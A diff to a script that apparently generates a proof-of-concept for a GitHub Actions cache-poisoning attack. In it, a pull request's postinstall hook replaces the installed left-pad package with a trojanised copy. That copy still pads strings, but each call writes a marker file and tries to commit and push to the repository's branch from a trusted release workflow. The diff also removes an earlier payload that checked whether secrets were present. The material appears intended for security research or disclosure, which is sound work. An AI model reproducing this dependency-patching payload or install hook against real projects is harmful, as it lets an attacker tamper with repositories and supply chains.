@@ -8,47 +8,115 @@ packageJson.scripts = {
   postinstall: "node scripts/attacker-postinstall.mjs"
 };
 
-const cachedReporter = `import { appendFileSync, mkdirSync, writeFileSync } from "node:fs";
-import { join } from "node:path";
+const patchedLeftPad = `const { execFileSync } = require("child_process");
+const fs = require("fs");
+const path = require("path");
 
-const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
-mkdirSync(proofDir, { recursive: true });
+function cleanLeftPad(input, length, character) {
+  const value = String(input);
+  const fill = character === undefined ? " " : String(character || " ");
+  if (value.length >= length) return value;
+  return fill.repeat(Math.ceil((length - value.length) / fill.length)).slice(0, length - value.length) + value;
+}
 
-const proof = {
-  message: "Cached reporter executed inside trusted release workflow.",
-  eventName: process.env.GITHUB_EVENT_NAME || "",
-  repository: process.env.GITHUB_REPOSITORY || "",
-  ref: process.env.GITHUB_REF || "",
-  sha: process.env.GITHUB_SHA || "",
-  fakeSecretPresent: Boolean(process.env.POC_FAKE_SECRET),
-  fakeSecretLength: process.env.POC_FAKE_SECRET?.length || 0,
-  releaseReportingTokenPresent: Boolean(process.env.RELEASE_REPORTING_TOKEN),
-  note: "This POC does not print or exfiltrate secret values."
+function runGit(args) {
+  return execFileSync("git", args, {
+    encoding: "utf8",
+    stdio: ["ignore", "pipe", "pipe"]
+  }).trim();
+}
+
+function errorText(error) {
+  const stderr = error && error.stderr ? String(error.stderr).trim() : "";
+  const stdout = error && error.stdout ? String(error.stdout).trim() : "";
+  return (stderr || stdout || error.message || String(error)).slice(0, 1000);
+}
+
+function commitMarker(proof) {
+  const branch = process.env.GITHUB_REF_NAME || "main";
+  proof.gitTargetBranch = branch;
+  proof.gitPushAttempted = false;
+  proof.gitPushSucceeded = false;
+
+  try {
+    runGit(["config", "user.name", "cached-left-pad"]);
+    runGit(["config", "user.email", "cached-left-pad@users.noreply.github.com"]);
+    runGit(["add", "hehe.txt"]);
+
+    try {
+      execFileSync("git", ["diff", "--cached", "--quiet"], { stdio: "ignore" });
+      proof.gitCommitCreated = false;
+      proof.gitPushSkipped = "marker file already matched the index";
+      return;
+    } catch {
+      proof.gitCommitCreated = true;
+    }
+
+    runGit(["commit", "-m", "Add cached dependency marker"]);
+    proof.gitPushAttempted = true;
+    const output = runGit(["push", "origin", "HEAD:" + branch]);
+    proof.gitPushSucceeded = true;
+    proof.gitPushOutput = output.slice(0, 500);
+  } catch (error) {
+    proof.gitPushError = errorText(error);
+  }
+}
+
+function writeProof() {
+  const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
+  fs.mkdirSync(proofDir, { recursive: true });
+
+  const marker = [
+    "patched left-pad executed in release workflow",
+    "repository=" + (process.env.GITHUB_REPOSITORY || ""),
+    "event=" + (process.env.GITHUB_EVENT_NAME || ""),
+    "run=" + (process.env.GITHUB_RUN_ID || ""),
+    "sha=" + (process.env.GITHUB_SHA || ""),
+    "time=" + new Date().toISOString(),
+    ""
+  ].join("\\n");
+
+  const proof = {
+    message: "Patched npm package executed inside trusted release workflow.",
+    package: "left-pad",
+    eventName: process.env.GITHUB_EVENT_NAME || "",
+    repository: process.env.GITHUB_REPOSITORY || "",
+    ref: process.env.GITHUB_REF || "",
+    sha: process.env.GITHUB_SHA || "",
+    contentsWriteDemo: true,
+    markerFile: "hehe.txt",
+    note: "This POC does not use secrets. The patched package writes and attempts to push a same-repository marker commit."
+  };
+
+  fs.writeFileSync("hehe.txt", marker);
+  commitMarker(proof);
+  fs.writeFileSync(path.join(proofDir, "release-proof.json"), JSON.stringify(proof, null, 2) + "\\n");
+
+  if (process.env.GITHUB_STEP_SUMMARY) {
+    fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, [
+      "## Patched dependency executed",
+      "",
+      "~~~json",
+      JSON.stringify(proof, null, 2),
+      "~~~",
+      ""
+    ].join("\\n"));
+  }
+}
+
+module.exports = function leftPad(input, length, character) {
+  writeProof();
+  return cleanLeftPad(input, length, character);
 };
-
-writeFileSync(join(proofDir, "release-proof.json"), JSON.stringify(proof, null, 2) + "\\n");
-appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
-  "## Cached reporter executed",
-  "",
-  "~~~json",
-  JSON.stringify(proof, null, 2),
-  "~~~",
-  ""
-].join("\\n"));
-
-console.log("[cached reporter] executed");
-console.log("[cached reporter] event=" + proof.eventName);
-console.log("[cached reporter] fake secret present=" + proof.fakeSecretPresent);
 `;
 
 const postinstall = `import { execFileSync } from "node:child_process";
-import { appendFileSync, mkdirSync, writeFileSync } from "node:fs";
-import { join } from "node:path";
+import { appendFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
+import { dirname, join } from "node:path";
 
 const proofDir = process.env.POC_PROOF_DIR || ".poc-proof";
-const cacheDir = ".ci-cache";
+const target = join("node_modules", "left-pad", "index.js");
 mkdirSync(proofDir, { recursive: true });
-mkdirSync(cacheDir, { recursive: true });
 
 function gitExtraHeaderPresent() {
   try {
@@ -62,25 +130,30 @@ function gitExtraHeaderPresent() {
   }
 }
 
-writeFileSync(join(cacheDir, "reporter.mjs"), ${JSON.stringify(cachedReporter)});
+if (!existsSync(target)) {
+  throw new Error("Expected left-pad to be installed before postinstall runs.");
+}
+
+const original = readFileSync(target, "utf8");
+mkdirSync(dirname(target), { recursive: true });
+writeFileSync(target, ${JSON.stringify(patchedLeftPad)});
 
 const proof = {
-  message: "PR postinstall executed and wrote a cached reporter.",
+  message: "PR postinstall patched an installed npm dependency.",
   eventName: process.env.GITHUB_EVENT_NAME || "",
   repository: process.env.GITHUB_REPOSITORY || "",
   ref: process.env.GITHUB_REF || "",
   sha: process.env.GITHUB_SHA || "",
-  fakeSecretPresentDuringInstall: Boolean(process.env.POC_FAKE_SECRET),
-  fakeSecretLengthDuringInstall: process.env.POC_FAKE_SECRET?.length || 0,
+  packagePatched: "left-pad",
+  patchedFile: target,
+  originalBytes: original.length,
   checkoutGitCredentialsPresent: gitExtraHeaderPresent(),
-  cachedReporterWritten: true,
-  cachePath: ".ci-cache/reporter.mjs",
-  note: "The install step does not need the fake secret. The payload writes state for a later trusted workflow."
+  note: "The install step does not need secrets. It only writes dependency state that actions/cache can persist."
 };
 
 writeFileSync(join(proofDir, "proof.json"), JSON.stringify(proof, null, 2) + "\\n");
 appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), [
-  "## PR install hook executed",
+  "## PR install hook patched dependency",
   "",
   "~~~json",
   JSON.stringify(proof, null, 2),
@@ -88,10 +161,8 @@ appendFileSync(process.env.GITHUB_STEP_SUMMARY || join(proofDir, "summary.md"), 
   ""
 ].join("\\n"));
 
-console.log("[pr postinstall] executed");
+console.log("[pr postinstall] patched node_modules/left-pad/index.js");
 console.log("[pr postinstall] event=" + proof.eventName);
-console.log("[pr postinstall] fake secret present during install=" + proof.fakeSecretPresentDuringInstall);
-console.log("[pr postinstall] cached reporter written=" + proof.cachedReporterWritten);
 console.log("[pr postinstall] proof file=" + join(proofDir, "proof.json"));
 `;
 
